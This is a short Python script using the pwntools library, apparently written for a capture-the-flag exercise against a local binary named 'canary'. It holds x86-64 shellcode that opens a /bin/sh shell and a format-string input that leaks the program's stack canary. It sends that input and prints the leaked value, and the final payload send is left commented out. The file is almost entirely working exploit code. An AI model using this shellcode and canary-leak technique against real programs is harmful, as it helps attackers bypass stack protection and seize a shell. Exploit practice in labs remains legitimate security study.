#!/usr/bin/python

import pwn

shellcode = (
    b"\x50\x48\x31\xd2\x48\x31\xf6\x48"
    + b"\xbb\x2f\x62\x69\x6e\x2f\x2f\x73"
    + b"\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
)

padding = b"a" * 8

format_str = b"_%11$p"

tail_padding = b"_" * 9

leak_can_str = padding + format_str + tail_padding


pty = pwn.process.PTY
p = pwn.process("./canary", stdin=pty, stdout=pty)

print("Sending ", leak_can_str)


p.sendline(leak_can_str)

canary = p.recvline()
print(canary)

# p.sendline(payload)
